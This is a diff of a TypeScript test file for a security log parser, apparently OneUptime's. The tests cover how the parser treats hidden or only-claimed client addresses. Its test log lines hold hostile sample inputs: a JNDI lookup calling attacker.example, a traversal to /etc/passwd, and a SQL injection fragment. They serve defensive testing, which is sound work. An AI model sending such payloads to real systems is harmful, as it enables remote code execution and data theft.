@@ -11,7 +11,7 @@ import { SECURITY_REQUEST_ATTRIBUTES } from "../../../../Types/SecurityEvent/Sec
 import SecurityLogParser from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
 import WebAttackLogParser, {
   AccessLogRequest,
-  ClientAddressReading,
+  ClientAddressReadingOfText,
   readClientAddress,
   readClientAddressReading,
   readCommonLogFormat,
@@ -19,6 +19,7 @@ import WebAttackLogParser, {
   readRequestFromAttributes,
 } from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
 import {
+  CLIENT_ADDRESS_SCRUB_MARKER_ATTRIBUTES,
   HiddenClientAddress,
   ScrubbedAddressKind,
   ScrubbedAddressPlace,
@@ -153,7 +154,21 @@ describe("an access log line whose client a scrub rule hid", () => {
     }
   });
 
-  test("an address the line's attributes name is the client's: nothing is hidden then", () => {
+  test("an address the line's attributes verify is the client's: nothing is hidden then", () => {
+    const event: NormalizedSecurityEvent = parseOne(
+      accessLogLine("[REDACTED]"),
+      {
+        "network.peer.address": "203.0.113.7",
+      },
+    );
+
+    expect(hiddenOf(event)).toEqual({
+      principalIp: "203.0.113.7",
+      hidden: null,
+    });
+  });
+
+  test("a client.address the line's attributes only claim leaves the hidden client hidden, and is kept as a claim (#10416)", () => {
     const event: NormalizedSecurityEvent = parseOne(
       accessLogLine("[REDACTED]"),
       {
@@ -162,9 +177,20 @@ describe("an access log line whose client a scrub rule hid", () => {
     );
 
     expect(hiddenOf(event)).toEqual({
-      principalIp: "203.0.113.7",
-      hidden: null,
+      principalIp: "",
+      hidden: {
+        kind: ScrubbedAddressKind.Redacted,
+        value: "[REDACTED]",
+        place: ScrubbedAddressPlace.LogBody,
+      },
     });
+    expect(event.attributes).toEqual(
+      expect.objectContaining({
+        "oneuptime.request.client_address_trust": "peer",
+        "oneuptime.request.claimed_client_address": "203.0.113.7",
+        "oneuptime.request.claimed_client_address_from": "client.address",
+      }),
+    );
   });
 
   test("no other address of the line takes the hidden client's place", () => {
@@ -227,12 +253,11 @@ describe("an access log line's client is never what its request says", () => {
 });
 
 describe("an application's log line whose client a scrub rule hid", () => {
-  test("its attributes' client address holds what the rule left", () => {
+  test("its attributes' connection address holds what the rule left", () => {
     for (const key of [
-      "client.address",
-      "http.client_ip",
       "net.peer.ip",
       "network.peer.address",
+      "net.sock.peer.addr",
       "source.address",
     ]) {
       expect(
@@ -253,6 +278,32 @@ describe("an application's log line whose client a scrub rule hid", () => {
           place: ScrubbedAddressPlace.LogAttributes,
         },
       });
+    }
+  });
+
+  test("its attributes' client.address, which a request can claim, is a hidden claim, never the hidden client (#10416)", () => {
+    for (const key of ["client.address", "http.client_ip"]) {
+      expect(
+        readRequestFromAttributes({ [key]: KEYED_TOKEN }).scrubbedClient,
+      ).toBeUndefined();
+
+      const event: NormalizedSecurityEvent = parseOne(
+        "WARN rejected header X-Api-Version=${jndi:ldap://attacker.example/x} on /api/v1/orders",
+        { [key]: KEYED_TOKEN, "url.path": "/api/v1/orders" },
+      );
+
+      expect({ key, ...hiddenOf(event) }).toEqual({
+        key,
+        principalIp: "",
+        hidden: null,
+      });
+      expect(event.attributes).toEqual(
+        expect.objectContaining({
+          "oneuptime.request.client_address_trust": "claimed",
+          "oneuptime.request.claimed_client_address": KEYED_TOKEN,
+          "oneuptime.request.claimed_client_address_from": key,
+        }),
+      );
     }
   });
 
@@ -307,7 +358,7 @@ describe("an application's log line whose client a scrub rule hid", () => {
   test("its attributes' hidden address is said before its words'", () => {
     const event: NormalizedSecurityEvent = parseOne(
       "WARN rejected ../../etc/passwd from [REDACTED]",
-      { "client.address": LEGACY_TOKEN },
+      { "network.peer.address": LEGACY_TOKEN },
     );
 
     expect(hiddenOf(event).hidden).toEqual({
@@ -315,6 +366,22 @@ describe("an application's log line whose client a scrub rule hid", () => {
       value: LEGACY_TOKEN,
       place: ScrubbedAddressPlace.LogAttributes,
     });
+  });
+
+  test("its words' hidden address is said before a hidden address its attributes only claim", () => {
+    const event: NormalizedSecurityEvent = parseOne(
+      "WARN rejected ../../etc/passwd from [REDACTED]",
+      { "client.address": LEGACY_TOKEN },
+    );
+
+    expect(hiddenOf(event).hidden).toEqual({
+      kind: ScrubbedAddressKind.Redacted,
+      value: "[REDACTED]",
+      place: ScrubbedAddressPlace.LogBody,
+    });
+    expect(event.attributes["oneuptime.request.claimed_client_address"]).toBe(
+      LEGACY_TOKEN,
+    );
   });
 });
 
@@ -348,9 +415,13 @@ describe("a line whose client no rule hid", () => {
     });
     expect(
       Object.keys(event.attributes).filter((key: string): boolean => {
-        return key.startsWith("oneuptime.request.client_address");
+        return CLIENT_ADDRESS_SCRUB_MARKER_ATTRIBUTES.includes(key);
       }),
     ).toEqual([]);
+    // The access log's client field is the connection's own address.
+    expect(event.attributes["oneuptime.request.client_address_trust"]).toBe(
+      "peer",
+    );
   });
 });
 
@@ -372,7 +443,7 @@ describe("what the log scan makes of a line", () => {
 
 describe("the client of a line in no known format, as read", () => {
   test("an address anywhere wins over what a rule left in a more telling place", () => {
-    const reading: ClientAddressReading = readClientAddressReading(
+    const reading: ClientAddressReadingOfText = readClientAddressReading(
       "[REDACTED] rejected union select from 203.0.113.25",
     );
 
